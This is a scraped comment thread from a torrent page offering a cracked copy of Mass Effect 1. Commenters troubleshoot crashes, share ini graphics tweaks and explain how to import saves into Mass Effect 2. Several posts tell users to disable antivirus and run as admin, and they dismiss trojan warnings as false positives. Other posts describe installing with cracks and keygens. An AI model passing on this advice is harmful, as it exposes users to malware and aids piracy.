@TheFirev1

I think you should use a ""cracked"" Update in order to Update the Game.


@Everyone else

Please note that Ã¡ll Â® Games4theworld Downloads are 100% virus free. This Game has been tested and IS working. Your Anti-Virus sometimes gives a false alarm, because of the way the files are packed. (It looks similar to a Trojan Horse, but it ISN'T)

@straw_soldier & @nordin_b

Please read this post on our Forum: http://games4theworld.bestgoo.com/t684-mass-effect-1-problem-solved


@heywood_j (And @nordin_b)

I think you don't even know what you're talking about. A lot of AV see cracks as a virus, because of the way it is packed. (It looks similar to a virus, but it ISN'T) The last thing I want is to spread a virus, because I know it ruins lives. You know how many viruses I've had, because I was testing software and cracks for you, so you only get the good stuff? At least you could show some respect. If you don't want to download torrents yourself, that's fine, but don't come here and talk crap. Look at the ""Trusted"" skull next to my name; it isn't there for fun, it has a reason.
Who funds us? No one, we're completely non-profit and do NOT earn anything doing this.
So please, next time think twice before posting something you don't know anything about.


@nordin_b

Please provide the exact error.

Now, start by reading the included ""# Installation Guide.txt"" and you should be able to get the game to work yourself. Good luck!

make sure all 3 files go there.

Doesn't need any CD keys or cracks.

For noobs, antivirus software is written to detect shit like this, and the fact that it detects something doesn't mean that it's actually infected.
Turn off antivirus when installing (i can automatically detect and stop things during installation, corrupting the install and preventing it from working. Turn it back on afterwards and do a scan if you're paranoid.

1. Always restart when installed
2. Always turn off antivirus when installing
3. Always run as admin
4. Always support the official release
5. ALWAYS SEED!"
,LeitrinG,2011-08-26T17:05Z,"''Please try the following:
1. Download and Install the v1.02 patch for the game from: http://files.bioware.com/masseffect/updates/MassEffect_EFIGS_1.02.exe

This worked for my problem regarding the 'general protection fault'! Note that you must not only copy the masseffect.exe! Copy and replace everything but the notepad!

And a little comment to the guys claiming this is virus: Trusted skull and a lots of comments regarding the gaming being fully working, say no more.

Hey man this worked PERFECTLY for me as well thx for posting. I was having trouble with Norton 360 killing the original patch, thinking it was a virus.  Even when I disabled Norton and added the file to the exclusion list it would still quarantine and delete.  Anyway, the update and patch are OK with Norton 360 on Win7 so thx again.

When I try to play, it enters on configure and I get an error message.
Please help"
,jfent100,2011-09-01T05:13Z,"@Felype

I was getting the same error message for a while.  It is because that application is not really the game.  It is MassEffectConfig.exe 

If you download the crack and patch from the LeitrinG's post and copy the dowloaded .exe file directly into the Binaries folder everything should work, BUT you must run right from that file not any ""shortcut"" file that also happens to be in the Binaries folder.  The .exe file I run off of is 19,556 KB in size. Should be the largest file in the folder.  From here, you can create a shortcut on the desktop by right clicking on the .exe file.
Hope this helps."

,Sivos,2012-02-11T18:16Z,"@Demwaffle

Norton 360......there's your problem.  Norton ALWAYS picks up false positives.  Why?  Because it's Norton!  Norton is a horrible anti virus program that will claim even .doc files as viruses.   When I use to have Norton, it would say everyday I had a virus without even doing anything (that was long before I ever heard of torrents).  Norton and McAfee were labeled the two anti virus programs to AVOID for a reason.  Anyone who claims a virus on this torrent is an idiot who clearly has no idea what a virus is.  I mean think about it, why in the world would someone upload 70 viruses and it was not removed by TPB?  You do know they do watch these files and they do remove them if they have viruses.  Why else do you think the fake ones never last for more than a couple of hours?  So I'm pretty sure that since this one was uploaded in 2010, it's fine.  And given how many claim this has a virus, there was clearly a few who had reported it.  TPB is letting it last, I wonder why?  Maybe because THERE IS NO VIRUS!  Idiotic noobs remain idiotic noobs."
,RaW-D-Coy,2012-02-16T08:15Z,"For those who want graphic tweak:
Mass Effect is a shooter-RPG hybrid that's a first of its kind. Some might argue that other shooter-RPG hybrids came before it (like the classic System Shock 2 and the more recent S.T.A.L.K.E.R. games), but the RPG aspects of those were watered-down affairs at best. Bioware fused the RPG aspect of Star Wars: Knights of the Old Republic with third-person shooter dynamics that can match most PC games today, creating the first shooter-RPG hybrid that strikes a perfect balance between frantic, cathartic gameplay and superb storytelling.

However, it didn't hit the ground running for me. Right out of the box, it struggled to deliver surround sound and had problems with anti-aliasing settings.

The Mass Effect performance and graphics tweaks I used after the jump. (The performance and graphics tweaks I used also solved the audio problems that plague Mass Effect.)

Note: No one ""owns"" these commands as they are common knowledge. However, Koroush Ghazi of Tweakguides.com has compiled many of the most useful Mass Effect performance and graphics tweaks and provided parameters and explanations in his Mass Effect tweak guide. For a more thorough rundown, I would advise you to visit the above page as the list below is just my personal ""quick scan"" reference (read: these are settings for my PC; these are not for ultra-low-end systems), just in case my hard drive suddenly goes postal.


The .ini files that hold the listed parameters can be found at (on Windows XP systems): My Documents\BioWare\Mass Effect\Config. Make sure to take note of the individual files (""BIOEngine.ini"" and ""BIOGame.ini"") and categories (""[Engine.GameEngine],"" ""[D3DDrv.D3DRenderDevice],"" etc) as various entries appear multiple times in the folder. As always, please make backup copies of the files you are going to edit.

BIOEngine.ini

[Engine.GameEngine]
bSmoothFrameRate=TRUE
MinSmoothedFrameRate=22.000000
MaxSmoothedFrameRate=75.000000

**Increases the maximum allowable framerate from the default cap.

DepthBias=0.12

**Graphics tweak; enables dynamic shadows. The last patch disabled them (many gamers complain that enabling Dynamic Shadows from the in-game menu doesn't work).

ModShadowFadeDistanceExponent=0.000000

**Graphics tweak; the game won't cull shadows even if the objects casting them are far away from the player.


[D3DDrv.D3DRenderDevice]
DisableHWShadowMaps=False

**Performance tweak; makes the video card render the game's shadows (instead of the CPU).


[SystemSettings]

Trilinear=TRUE
SkeletalMEshLODBias=-1
ParticleLODBias=-1

**Graphics tweak; heightens the quality of textures and particles.

[ISACTAudio.ISACTAudioDevice]
MaxChannels=64
TimeBetweenHWUpdates=15.000000
MinOggVorbisDurationGame=20
MinOggVorbisDurationEditor=4
TotalAvailableChannels=62
//DeviceName=Generic Software
DeviceName=Generic Software
ReserveChannels=2
UseEffectsProcessing=False

**Audio tweaks; the above list fixed the sound bugs (glitches) on my system. (If you are not using a Realtek HD sound solution, the above might not work for your system. Please see Tweakguides' Mass Effect tweak guide or go to the official Mass Effect forums.) Note that ""//DeviceName=Generic Software"" is an added line. Without this, the fix won't work.


BIOGame.ini

[BIOC_Base.BioActorBehavior]

AllowFriendlyCollateral=TRUE

**Gameplay tweak; enables friendly fire.



[BIOC_Base.BioPawnBehavior]

m_bAllowPhysicsOnDeadBodies=TRUE

[BIOC_Base.BioPawn]

m_fCorpseCleanupFirstAttemptTime=25.0

**Gameplay tweak; increases the time (in seconds) before the game culls dead bodies."

Most of the comments mentioning the virus have been pretty polite mentions of the suspicious activity which is understandable.

 whilst the backlash has been fucking shameful. Going fucking ape shit as soon as someone mentions virus, like they've shouted bomb in an airport. Either explain to them what is the problem or just ignore them. if you ignore them they will probably figure out for themselves.

The threat your getting is not a virus. To your Anti-Virus software (just like my norton 360) detects it as a virus.

Go to where ever you downloaded Mass Effect. Open it with either Winrar or 7-zip. You should see more files, click on install and go from there. There is a Install Instructions file that came with the download."

create a folder wherevr you want call it w.e like Mass.Effect 1

Mount the .ISO using w.e I used Alcohol 120%, do not run AUTOSETUP, instead OPEN the folder, hit cntrl A or just highlight EVERYTHING. Copy the contents and paste them into the folder Mass Effect 1, once done open folder right click setup.exe run in compat mode XP Service Pack 2, run setup.exe and use the code from the keygen OR use the one i used

,Shadow416,2012-03-13T05:32Z,"oh and FYI some anti-viruses interfere with the installation for windows 7 base platforms THIS was identified as a problem by BIOWARE themselves and other memebers on EA forums, not because of torrent you just downloaded. So if your Anti-Virus is gettign in the way, turn off, install again. Once done, turn it back on ."

Oh no. Someone is about to actually buy the game. Somebody stop him, it would be such an awful shame if he had to actually support the game industry."
,ELSheepO,2012-03-14T14:33Z,"Hi, my first ever comment. I've downloaded it, installed it, followed enragedplatypus instructions on page 6. the lancher comes up, the configuration comes up, a play button comes press that, then nothing. windows 64 bit user here"
,misterxar,2012-03-14T17:16Z,"For everyone who's having problems with Mass Effect on Windows 7, just let it sit for about 5-10 minutes. It'll eventually show up, although it's very annoying having to wait that long."
,ELSheepO,2012-03-14T20:08Z,"waited, didn't work"

,Oreo2996,2012-03-18T23:07Z,"Somebody please help.

I have beaten the game, and now want to move on to Mass Effect 2. Although, I can not find the save file in order to import the same character.

Does anybody know how to import the character?

Cheers."

Yes email me from my post below :)

Or try this....

Steps for importing a ME1 save
------------------------------

1) Run the Mass Effect 2 configuration utility from the main launcher. Which is found here:-
   C:/Program File/Mass Effect 2/Binaries/MassEffect2Config.exe
2) Click the 'Save Games' button.
3) Click the 'Copy Mass Effect 1 Save Games' button,and select the appropriate location for your ME1 save game. 
(The default location is 'My DocumentsbiowareMass EffectSave'.)
4) This will copy the appropriate save games from your ME1 directory into the proper place in the ME2 directory.
5) Run Mass Effect 2, and from the main menu select 'New Game'.
6) Select 'Import ME1 Character'.
7) Your savegame should now show up in the list."

,RomasD,2012-04-30T23:57Z,"ive downloaded this torrent twice and i got the same problem in both occasions !

i installed the game fine but when i started playing the graphics looked horrible, it was like a raw, unfinished version of what the graphics should have been, shepards armor was a cheap black and nihilus' face very blurry, generally the graphics were weird and horrible, i tried to change the quality but that did not work, any ideas on how to fix that ? "
,Aieolos,2012-05-01T06:49Z,"DO NOT DOWNLOAD. This torrent contains a trojan, don't download it unless you want your computer to become a decorative paperweight."
,RomasD,2012-05-24T16:16Z,"please help with my problem stated above !!

the only problem i have is the horrible graphics or more like the absense of graphics. they look like renders of what it could have been the armor or the faces of the characters !"
,Whyttedragun,2012-05-30T07:23Z,"@Aieolos:  Are you using Norton?  That's the only way a trojan would be able to make your comp into a ""decorative paperweight.""  Otherwise, a real AV would catch it, disable it, and jeeo your comp running just fine.

On a side note, anyone who IS running a real AV catch a bug report from this torrent?"
